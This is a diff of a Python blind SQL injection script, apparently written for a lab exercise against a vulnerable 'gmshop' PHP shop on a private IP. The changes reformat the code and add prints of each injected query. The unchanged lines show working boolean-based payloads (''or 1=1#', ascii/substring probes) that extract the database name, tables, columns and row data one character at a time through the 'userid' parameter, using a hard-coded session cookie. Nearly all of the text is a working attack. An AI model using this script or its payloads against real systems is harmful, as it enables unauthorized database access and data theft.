@@ -6,21 +6,25 @@ import re
 URL = 'http://192.168.81.129/gmshop/idsearch.php'
 cookies = {"PHPSESSID":"da519c2141b0a35c10d91abd16b4d2d0"}
 
+
+
 # TRUE: 해당하는 ID가 이미 있습니다. (17)
 # FALSE: 사용할수있는 ID 입니다. (14)
 def boolType():
-    res1 = requests.get(URL, params={'userid':'\'or 1=1#'}, cookies=cookies)
-    res2 = requests.get(URL, params={'userid':'\'or 1=2#'}, cookies=cookies)
-    html1=res1.content.decode('euc-kr', 'replace')
-    html2=res2.content.decode('euc-kr', 'replace')
+    res1 = requests.get(URL, params={'userid': '\'or 1=1#'}, cookies=cookies)
+    res2 = requests.get(URL, params={'userid': '\'or 1=2#'}, cookies=cookies)
+    html1 = res1.content.decode('euc-kr', 'replace')
+    html2 = res2.content.decode('euc-kr', 'replace')
 
-    soup1=BeautifulSoup(html1)
-    soup2=BeautifulSoup(html2)
+    soup1 = BeautifulSoup(html1)
+    soup2 = BeautifulSoup(html2)
 
-    trueType=soup1.find('td', height='30')  
-    falseType=soup2.find('td', height='30')  
-    print("[TRUE]문자열: {str}\n[TRUE]문자열 길이:{len}".format(str=trueType.text, len=len(trueType.text)))
-    print("[FALSE]문자열: {str}\n[FALSE]문자열 길이:{len}".format(str=falseType.text, len=len(falseType.text)))        
+    trueType = soup1.find('td', height='30')
+    falseType = soup2.find('td', height='30')
+    print("[TRUE]문자열: {str}\n[TRUE]문자열 길이:{len}".format(
+        str=trueType.text, len=len(trueType.text)))
+    print("[FALSE]문자열: {str}\n[FALSE]문자열 길이:{len}".format(
+        str=falseType.text, len=len(falseType.text)))
 boolType()
 
 # 쿼리 요청 응답 마스터
@@ -40,6 +44,7 @@ def get_database_length():
         if (len(check) == 17):
             print("[+] 데이터베이스 길이 : %d"%l)
             break
+    print("[+] 데이터베이스 길이 쿼리 : " + get_data.get('userid'))
     return l
 
 
@@ -47,8 +52,9 @@ def get_database_length():
 def get_database_name(length):
     database_name = ''
     for idx in range(length+1):
-        for a in range(33,127):
-            get_data = {'userid':'\' or 1=1 and ascii(substring(database(), {idx}, 1))={ascii}#'.format(idx = idx, ascii=a)}
+        for a in range(33, 127):
+            get_data = {'userid': '\' or 1=1 and ascii(substring(database(), {idx}, 1))={ascii}#'.format(
+                idx=idx, ascii=a)}
             check = query_master(get_data)
 
             if (len(check) == 17):
@@ -56,6 +62,7 @@ def get_database_name(length):
                 print("[SUCESS] {c}".format(c=database_name))
                 break
     print("[+] 데이터베이스 명 : "+database_name)
+    print("[+] 데이터베이스 명 쿼리 : " + get_data.get('userid'))
     return database_name
 
 
@@ -72,6 +79,7 @@ def get_table_length(name):
         if (len(check) == 17):
             print("[+] 테이블 길이 : %d"%a)
             break
+    print("[+] 테이블 길이 쿼리: " + get_data.get('userid'))
     return a
 
             
@@ -93,6 +101,7 @@ def get_table_name_query(length, db_name):
                 print("[SUCESS] {c}".format(c=table_name))
                 break
     print("[+] 테이블 명 : "+table_name)
+    print("[+] 테이블 명 쿼리: " + get_data.get('userid'))
     return table_name
 
 # 데이터 길이 구하기
@@ -114,6 +123,8 @@ def get_col_length(name):
         if (len(check2) == 17):
             print("[+] check2 데이터 길이 : %d"%b)
             break
+    print("[+] 데이터 길이 쿼리: " + get_data1.get('userid'))
+    print("[+] 데이터 길이 쿼리: " + get_data2.get('userid'))
     return a, b
 
 
@@ -148,6 +159,8 @@ def get_col_name(name, data_num1, data_num2):
                 break
     print("[+] 첫 번째 컬럼 데이터 : %s"%data_str1)
     print("[+] 두 번째 컬럼 데이터 : %s"%data_str2)
+    print("[+] 데이터 문자열 쿼리 : " + get_data1.get('userid'))
+    print("[+] 데이터 문자열 쿼리 : " + get_data2.get('userid'))
     return data_str1, data_str2
 
 # 데이터 길이
@@ -167,6 +180,8 @@ def get_get_data_len(col1, col2, name):
         if (len(data1) == 17 & len(data2) == 17):
             break
     print("[+] 데이터 길이 : %d"%a)
+    print("[+] 데이터 길이 쿼리 : " + get_data1.get('userid'))
+    print("[+] 데이터 길이 쿼리 : " + get_data2.get('userid'))
     return a
 
 
@@ -198,6 +213,8 @@ def get_get_data_name(name,col1, col2, num):
                 break
     print("[+] 데이터 : %s"%data_str1)
     print("[+] 데이터 : %s"%data_str2)
+    print("[+] 데이터 쿼리 : " + get_data1.get('userid'))
+    print("[+] 데이터 쿼리 : " + get_data2.get('userid'))
     return data_str1, data_str2
 
 # admin_login
